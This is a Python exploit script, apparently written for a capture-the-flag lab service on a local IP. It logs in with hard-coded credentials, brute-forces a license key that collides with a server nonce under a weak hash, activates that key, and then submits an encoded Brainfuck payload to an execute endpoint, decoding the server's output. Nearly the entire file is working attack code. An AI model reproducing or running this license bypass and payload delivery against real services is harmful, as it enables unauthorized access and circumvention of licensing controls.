#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys, re, requests


def hack(nonce, license):
    nonce = nonce.split('-')
    license = license.split('-')
    nonce_resulting = key_resulting = 0
    for c, i in enumerate(nonce):
        nonce_resulting = int((((nonce_resulting + (int(i, 16) * 1337) + int('137', 16) * c) % 64) + 1) * 37)
    for c, i in enumerate(license):
        key_resulting = int((((key_resulting + (int(i, 16) * 1337) + int('137', 16) * c) % 64) + 1) * 37)
    return nonce_resulting, key_resulting


def evaluate(code):
    code = cleanup(list(code))
    bracemap = buildbracemap(code)

    cells, codeptr, cellptr = [0], 0, 0

    while codeptr < len(code):
        command = code[codeptr]

        if command == ">":
            cellptr += 1
            if cellptr == len(cells): cells.append(0)

        if command == "<":
            cellptr = 0 if cellptr <= 0 else cellptr - 1

        if command == "+":
            cells[cellptr] = cells[cellptr] + 1 if cells[cellptr] < 255 else 0

        if command == "-":
            cells[cellptr] = cells[cellptr] - 1 if cells[cellptr] > 0 else 255

        if command == "[" and cells[cellptr] == 0: codeptr = bracemap[codeptr]
        if command == "]" and cells[cellptr] != 0: codeptr = bracemap[codeptr]
        if command == ".": sys.stdout.write(chr(cells[cellptr]))
        if command == ",": cells[cellptr] = ord(getch.getch())

        codeptr += 1


def cleanup(code):
    return ''.join(filter(lambda x: x in ['.', ',', '[', ']', '<', '>', '+', '-'], code))


def buildbracemap(code):
    temp_bracestack, bracemap = [], {}

    for position, command in enumerate(code):
        if command == "[": temp_bracestack.append(position)
        if command == "]":
            start = temp_bracestack.pop()
            bracemap[start] = position
            bracemap[position] = start
    return bracemap

def ascii_to_brain_fuck(text):
    bf_code = ''
    for i in text:
        bf_code += '+' * ord(i) + '|>'
    return bf_code

#ip = sys.argv[1]
ip = '192.168.1.206' + ':5000'
url = 'http://{}'.format(ip)

s = requests.Session()

auth = {"username":"lucky","password":"lucky"}

s.post(url + '/login', json=auth, timeout=(None,None))

json_response = s.get(url + '/get_license_nonce', timeout=(None,None)).json()

license_nonce = json_response['license_nonce']

cnt = 0
key = ''
while True:
    key = 'FFFF-FFFF-FFFF-{:04x}'.format(cnt)
    a, b = hack(license_nonce, key)
    cnt += 1
    if a == b:
        print(a, b, sep='    ')
        print(key)
        break

license_key = {"license_key":key} # проверка ключа
json_response = s.post(url + '/activate_license', json=license_key, timeout=(None,None)).json()

bf = '++++++++[>+>++>+++>++++>+++++>++++++>+++++++>++++++++>+++++++++>++++++++++>+++++++++++>++++++++++++>+++++++++++++>++++++++++++++>+++++++++++++++>++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>>>>>>>>+++.---<<<<<<<<<<<<<<>>>>>>>>>>>>>>>+.-<<<<<<<<<<<<<<<>>>>>>>>>>>>>>+++.---<<<<<<<<<<<<<<>>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<<>>>>>.<<<<<>>>>>-.+<<<<<>>>>>>>>>>>>+++.---<<<<<<<<<<<<>>>>>>>>>>>>+.-<<<<<<<<<<<<>>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<<>>>>.<<<<>>>>>>-.+<<<<<<>>>>>>>>>>>>>.<<<<<<<<<<<<<>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<>>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>>>-.+<<<<<<>>>>>>>>>>>>+++.---<<<<<<<<<<<<>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>>>>>>>>>-.+<<<<<<<<<<<<>>>>>>>>>>>>>>+++.---<<<<<<<<<<<<<<>>>>>>>>>>>>>>>----.++++<<<<<<<<<<<<<<<>>>>>>>>>>>>>>-.+<<<<<<<<<<<<<<>>>>>>>>>>>>>>++.--<<<<<<<<<<<<<<>>>>>>>>>>>>+.-<<<<<<<<<<<<>>>>>>>>>>>>>-.+<<<<<<<<<<<<<>>>>>>>>>>>>>---.+++<<<<<<<<<<<<<>>>>>>-.+<<<<<<>>>>>++.--<<<<<>>>>>-.+<<<<<>>>>>+.-<<<<<.'
bf = bf.replace('.', '|') + '!'

data = {'code': bf, 'password': ""}

text_response = s.post(url + '/bf/?action=execute', json=data, timeout=(None,None)).text

print(text_response)

for item in text_response.split('\n'):
    print(evaluate(re.sub('[a-zA-Z0-9]', '', str(item)).replace('|','.').replace('!','')))
